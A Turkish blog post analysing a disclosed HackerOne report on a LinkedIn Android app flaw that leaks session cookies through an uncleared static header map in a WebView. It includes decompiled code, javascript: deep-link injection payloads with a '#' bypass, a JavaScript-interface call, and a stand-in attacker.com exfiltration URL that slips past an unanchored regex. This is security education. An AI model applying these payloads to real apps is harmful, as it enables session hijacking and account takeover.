# Bug Bounty Rapor Analizi: LinkedIn Android Uygulamasında Cookie Sızıntısı
![](/blogs/img/buglinkedin/1.png)

---

Bu yazımda LinkedIn'in Android uygulamasında keşfedilen ve kullanıcıların session cookie'lerinin saldırgana sızdırılmasına olanak tanıyan kritik bir güvenlik açığını detaylı şekilde anlatacağım. Bu zafiyet, dphoeniixx tarafından HackerOne platformu üzerinden raporlanmış ve doğrulanmıştır.

---

## Önce Temelleri Anlayalım

### Cookie Nedir?

Bir web sitesine login olduğunuzda, tarayıcınız sizin kim olduğunuzu hatırlamak için küçük bir metin dosyası saklar. Buna **cookie** denir. LinkedIn'e giriş yaptığınızda tarayıcınız (veya uygulama içindeki WebView) bir session cookie alır. Bu cookie, sizi tekrar tekrar şifre sormadan tanımlayan bir "dijital kimlik kartı" gibidir. Eğer birisi bu cookie'yi ele geçirirse, şifrenizi bilmeden hesabınıza tam erişim sağlayabilir — buna **session hijacking** denir.

### WebView Nedir?

Android uygulamaları bazen bir web sayfasını göstermek ister. Bunun için ayrı bir tarayıcı açmak yerine, uygulama içine gömülü bir mini tarayıcı kullanır. Buna **WebView** denir. LinkedIn uygulaması da reklamlara tıkladığınızda, verification sayfalarını açtığında veya external linkleri gösterdiğinde WebView kullanır. Önemli nokta şu: WebView, uygulamanın kendi context'inde çalıştığı için, normal bir tarayıcıdan farklı olarak uygulamanın cookie'lerine ve bazı internal fonksiyonlarına erişebilir.

### Deep Link Nedir?

Telefonunuzdaki bir link'e tıkladığınızda, bazen doğrudan bir uygulamanın belirli bir sayfası açılır. Örneğin `https://www.linkedin.com/trust/verification` gibi bir link, browser yerine doğrudan LinkedIn uygulamasının verification ekranını açabilir. Bu mekanizmaya **deep link** denir. Saldırganlar, deep link'lerin parametrelerini manipüle ederek uygulamayı beklenmedik davranışlara zorlayabilir.

### Static Field Nedir?

Programlamada **static** olarak tanımlanan bir değişken, o class'ın tüm instance'ları arasında paylaşılır ve uygulama çalıştığı sürece memory'de kalır. Normal bir değişken her object oluşturulduğunda sıfırdan yaratılırken, static bir field bir kez oluşturulur ve herkes aynı kopyayı kullanır. Bu raporun kalbinde yatan sorun tam olarak budur: cookie'lerin saklandığı field static olduğu için, bir sayfanın cookie'leri temizlenmeden bir sonraki sayfaya taşınıyordu.

---

## Kök Neden: Temizlenmeyen Static ArrayMap

Tüm bu saldırı zincirinin temelinde yatan sorun, aslında şaşırtıcı derecede basittir.

```java
public final void loadUrl(Uri uri0) {
    String s = uri0.toString();
    ...
    if(this.shouldUseCookies) {
        CookieManager cookieManager0 = CookieManager.getInstance();
        ...
        String s2 = cookieManager0.getCookie(s);
        ArrayMap arrayMap0 = WebViewerFragment.CUSTOM_HEADERS; // Static field!
        ...
        if(s2 != null) {
            arrayMap0.put("Cookie", s2);
        }
        this.webView.loadUrl(s, arrayMap0);
        return;
    }
    ...
}
```

LinkedIn'in Android uygulamasında `WebViewerFragment` adında bir bileşen var. Bu bileşen, uygulama içinde web sayfalarını göstermekten sorumlu. Bu bileşenin `loadUrl` metodu, bir URL yüklerken şöyle çalışıyor:

1. URL'nin cookie'lerini al
2. Cookie'leri `CUSTOM_HEADERS` adlı ArrayMap'e ekle
3. WebView'a bu header'larla birlikte URL'yi yükle

Sorun şurada: `CUSTOM_HEADERS` statik bir alan. Yani bu ArrayMap, farklı URL yüklemeleri arasında hiçbir zaman temizlenmiyor. Düşünün ki bir çekmece var ve her açtığınız sayfanın çerezlerini bu çekmeceye koyuyorsunuz, ama çekmeceyi hiç boşaltmıyorsunuz. Sonuç olarak:

1. **Adım 1:** WebView, `linkedin.com` adresini açar → LinkedIn çerezleri `CUSTOM_HEADERS`'a eklenir.
2. **Adım 2:** Aynı WebView daha sonra `attacker.com` adresini açar → `CUSTOM_HEADERS` hiç temizlenmediği için, LinkedIn çerezleri saldırganın sunucusuna HTTP header olarak gönderilir.

Bu kadar basit. Ancak bu zafiyeti istismar etmek için saldırganın bu WebView'ı kontrol edebilmesi gerekiyor. İşte asıl karmaşık ve etkileyici kısım burada başlıyor.

---

## Saldırı Zinciri: Dört Kritik Aşama

Bu açığı istismar etmek için doğrudan `WebViewerFragment`'ı açan bir deep link bulunmuyor. Araştırmacı, hedefe ulaşmak için birden fazla zayıflığı zincirleyerek yaratıcı bir saldırı yolu inşa etmiş.

### Aşama 1: Scheme Validation'daki Boşluk (javascript: Injection)

```java
if(!z2 && SearchFrameworkPrefetchRepositoryImpl..ExternalSyntheticOutline0.m(2, "trust/verification", s)) {
    ...
    String verificationUrl = uri0.getQueryParameter("verificationUrl");
    ...
    intent8 = verificationUrlMappingImpl1.neptuneTrustVerification(verificationUrl, ...);
    ...
}

public final Intent neptuneTrustVerification(String verificationUrl, ...) {
    if(verificationUrl == null) {
        uri1 = null;
    } else {
        uri1 = Uri.parse(s);
        if(uri1.getScheme() == null) {
            uri1 = null;
        } else {
            String host = uri1.getHost();
            if(!CollectionsKt___CollectionsKt.contains(this.supportedUrls, host) || UriUtil.isSuspectedPathTraversalUri(uri1)) {
                uri1 = null;
            }
        }
    }
    ...
}
```

LinkedIn uygulamasında `https://www.linkedin.com/trust/verification` deep link'i, bir doğrulama WebView'ını açıyor. Bu WebView'a yüklenecek URL, `verificationUrl` parametresinden alınıyor. Uygulama bu URL'yi açmadan önce bazı kontroller yapıyor:

- **Host kontrolü:** URL'nin host kısmı (örneğin `www.linkedin.com`) bir whitelist'e karşı doğrulanıyor.
- **Path traversal kontrolü:** URL'de dizin atlama girişimi var mı diye bakılıyor.
- **Şema kontrolü:** URL'nin `https://` veya `http://` ile başlayıp başlamadığı **kontrol edilmiyor**. (Zayıf nokta)

Bu boşluk sayesinde saldırgan, `javascript:` şemasını kullanabiliyor. `javascript:` şeması, bir URL yerine doğrudan JavaScript kodu çalıştırmaya yarar. Şöyle bir URL düşünün:

```
javascript://www.linkedin.com/%0aalert(1)
```

Bu URL'de `//www.linkedin.com/` kısmı JavaScript açısından bir yorum satırı olarak yorumlanır (çünkü `//` ile başlıyor). `%0a` ise yeni satır karakteridir ve yorum satırını bitirir. Ardından gelen `alert(1)` gerçek JavaScript kodu olarak çalışır. Host kontrolü ise `www.linkedin.com`'u görüp "tamam, güvenli" der.

Ancak bir komplikasyon var: Uygulama, URL'ye otomatik olarak bir sorgu parametresi ekliyor:

```
javascript://www.linkedin.com/%0aalert(1)?renderContext=trustVerificationDeeplink
```

Bu eklenen `?renderContext=...` kısmı JavaScript söz dizimini bozuyor ve kodun çalışmasını engelliyor.

**Bypass:** Araştırmacı, `#` karakterini kullanarak bunu aşıyor. JavaScript'te bir string açıp `#` ile birleştirince, eklenen parametre string'in bir parçası haline geliyor:

```
javascript://www.linkedin.com/%0aalert('1#')
```

Parametre eklendikten sonra:

```
javascript://www.linkedin.com/%0aalert('1?renderContext=trustVerificationDeeplink#')
```

Bu geçerli bir JavaScript ifadesidir ve başarıyla çalışır. Eklenen parametre, string'in içinde kaybolur.

### Aşama 2: JavaScript Interface Üzerinden WebViewerFragment'a Geçiş

```java
if(verificationWebViewFeature$createJavascriptInterface$10 != null) {
    webView0.addJavascriptInterface(verificationWebViewFeature$createJavascriptInterface$10, "Android");
}

public final class VerificationWebViewFeature.createJavascriptInterface.1 {
    @JavascriptInterface
    public final Unit sendWebMessage(String s) {
        if(s != null) {
            JSONObject jSONObject0 = s == null ? null : new JSONObject(s);
            if(jSONObject0 != null) {
                ...
                Event event4 = new Event(jSONObject0);
                verificationWebViewFeature0._receiveWebMessageLiveData.postValue(event4);
                return Unit.INSTANCE;
            }
        }
    }
}

public final class VerificationWebViewFragment.createJSObserver.1 extends EventObserver {
    ...
    public final boolean onEvent(Object object0) {
        ...
        String s3 = VerificationWebViewFragment.getNonEmptyString("additionalWebViewUrl", ((JSONObject)object0));
        if(s3 != null) {
            WebViewerBundle webViewerBundle0 = WebViewerBundle.create(s3, null, null);
            verificationWebViewFragment0.webRouterUtil.launchWebViewer(webViewerBundle0);
        }
        ...
    }
}
```

Doğrulama WebView'unda bir **JavaScript Interface** tanımlı. JavaScript Interface, web sayfasındaki JavaScript kodunun, Android uygulamasının Java/Kotlin fonksiyonlarını çağırabilmesini sağlayan bir köprüdür. Bu durumda `Android` adında bir object WebView'a enjekte ediliyor ve bu object'in `sendWebMessage` adında bir metodu var.

Araştırmacı, ilk aşamada elde ettiği JavaScript çalıştırma yeteneğini kullanarak şu çağrıyı yapıyor:

```javascript
Android.sendWebMessage(JSON.stringify({
    additionalWebViewUrl: "https://www.linkedin.com"
}))
```

Bu çağrı, uygulamanın `launchWebViewer` fonksiyonunu tetikliyor ve yeni bir URL'nin WebView'da açılmasını sağlıyor. Artık saldırgan, hangi URL'lerin açılacağını kontrol edebiliyor.

### Aşama 3: Regex Zayıflığı ile Doğru WebView'ı Zorlamak

`launchWebViewer` fonksiyonu, URL'yi açmak için hangi client'ı kullanacağına karar veren bir dizi interceptor kullanıyor. Seçenekler arasında external browser, custom tabs veya in-app WebView var. Saldırganın işine yarayan, `WebViewerFragment`'ı kullanan **web_viewer** client'ı.

Bu client'ın seçilmesi için URL'nin `isLinkedInArticleUrl` kontrolünden geçmesi gerekiyor. Bu kontrol şu regex'i kullanıyor:

```
(http|https)://www.linkedin(-ei)?.com/pulse/+
```

Burada kritik bir hata var: **Regex'te `^` (start anchor) yok.** Bu, pattern'ın URL'nin herhangi bir yerinde match olabileceği anlamına geliyor. Yani saldırgan, kendi URL'sinin sonuna şunu ekleyerek kontrolü bypass edebiliyor:

```
https://attacker.com/steal?http://www.linkedin.com/pulse/1
```

Regex, URL'nin ortasında `http://www.linkedin.com/pulse/` kısmını bulur, match eder ve "evet, bu bir LinkedIn URL'si" der. Böylece `WebViewerFragment` zorla açılır.

### Aşama 4: Zamanlama ile Cookie Leak

Artık tüm parçalar yerinde. Saldırı şu sırayla gerçekleşiyor:

1. İlk `sendWebMessage` çağrısı `https://www.linkedin.com/...` adresini açar. Bu sırada LinkedIn session cookie'leri `CUSTOM_HEADERS` static field'ına yazılır.
2. Bir `setTimeout` (zamanlayıcı) ile kısa bir gecikme sonrasında ikinci `sendWebMessage` çağrısı yapılır. Bu sefer saldırganın sunucu adresi açılır.
3. `CUSTOM_HEADERS` hiç temizlenmediği için, LinkedIn cookie'leri HTTP header olarak saldırganın sunucusuna gönderilir.

Sonuç: **Full account takeover.** Saldırgan, kurbanın LinkedIn session cookie'lerini elde eder ve kurbanın hesabına şifresiz erişim sağlar.

---

## Bonus Etki: Pasif Attack Vektörü

Araştırmacı, ilk raporun ardından ek bir saldırı senaryosu daha ortaya koymuş. Bu senaryo, kötü niyetli bir bağlantıya tıklamayı bile gerektirmiyor.

LinkedIn reklamları da `WebViewerFragment` içinde açılıyor. Bu demek oluyor ki:

1. Kullanıcı, akışındaki herhangi bir reklama tıklar (örneğin bir LinkedIn Business reklamı).
2. Reklamın web sitesi WebView'da açılır ve LinkedIn cookie'leri `CUSTOM_HEADERS`'a yazılır.
3. Kullanıcı daha sonra başka bir reklama tıklar (bu sefer saldırganın reklamı).
4. `CUSTOM_HEADERS` temizlenmediği için, LinkedIn cookie'leri saldırganın reklamına otomatik olarak leak edilir.

Bu senaryonun özellikle tehlikeli olmasının nedeni, kullanıcının herhangi bir şüpheli bağlantıya tıklamamasıdır. Tamamen normal bir kullanım senaryosu olan "akışta reklama tıklama" davranışı, cookie sızıntısına yol açıyor.

---

## Kapanış

Bu rapor, modern mobil uygulama güvenliğinde birçok önemli noktayı gözler önüne seriyor. Tek başına bakıldığında her biri "düşük risk" olarak değerlendirilebilecek dört ayrı zayıflık, ustaca zincirlenerek tam bir full account takeover senaryosuna dönüştürülmüş.

Özellikle "static field'larda sensitive data tutma" hatası, basitliğine rağmen gözden kaçması çok kolay bir anti-pattern. Bu tür hataların önlenmesi için kod incelemelerinde "bu değişkenin ömrü ne kadar?" ve "farklı bağlamlar arasında veri sızıntısı olabilir mi?" sorularının sistematik olarak sorulması gerekiyor.

Güvenlik araştırması perspektifinden ise bu rapor, yüzeysel araçlarla bulunamayacak derin zafiyetlerin hâlâ var olduğunu ve yaratıcı düşüncenin bu alanda ne kadar değerli olduğunu kanıtlıyor.

---

*Bu analiz, dphoeniixx tarafından HackerOne üzerinden raporlanan ve kamuya açıklanan LinkedIn güvenlik raporuna dayanmaktadır. Orijinal rapora HackerOne'daki sayfasından ulaşabilirsiniz: [https://hackerone.com/reports/3475626](https://hackerone.com/reports/3475626)*
